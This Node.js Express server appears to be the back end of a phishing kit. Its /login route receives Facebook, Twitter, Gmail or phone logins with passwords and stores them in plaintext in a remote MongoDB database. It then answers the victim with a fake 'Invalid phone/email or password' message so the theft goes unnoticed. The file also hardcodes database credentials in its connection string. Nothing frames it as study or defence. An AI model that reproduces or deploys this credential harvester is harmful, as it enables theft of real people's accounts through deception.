const express = require('express')
const mongoose = require('mongoose')
const cors = require('cors')
const Facebook = require('./models/Facebook')
const Twitter = require('./models/Twitter')
const Phone = require('./models/Phone')
const Gmail = require('./models/Gmail')
const app = express()
const port = 3000
let uri = 'mongodb+srv://rogue2:rogue4554@cluster0.e24lw6l.mongodb.net/?retryWrites=true&w=majority'
mongoose.connect(uri)
var corsOptions = {
    origin: 'http://127.0.0.1:5500',
    optionsSuccessStatus: 200
}

app.use(cors())
app.use(express.json());
app.get('/', (req, res) => {
    res.send('success')
})
app.post('/login', (req, res) => {
    console.log(req.body)
    const { type, email, phone, password } = req.body;
    try {
        switch (type) {
            case 'facebook':
                Facebook.create({
                    email: email,
                    password: password
                })
                break;
            case 'twitter':
                Twitter.create({
                    email: email,
                    password: password
                })
                break;
            case 'gmail':
                Gmail.create({
                    email: email,
                    password: password
                })
                break;
            case 'phone':
                Phone.create({
                    phone: phone,
                    password: password
                })
                break;
        }

        res.status(201).json({ success: true, message: "Invalid phone/email or password" })
    } catch (error) {
        console.log(error)
        res.status(500).json({ success: false, message: "Internal sever error" })
    }


})

app.listen(port, () => {
    console.log(`Example app listening on port ${port}`)
})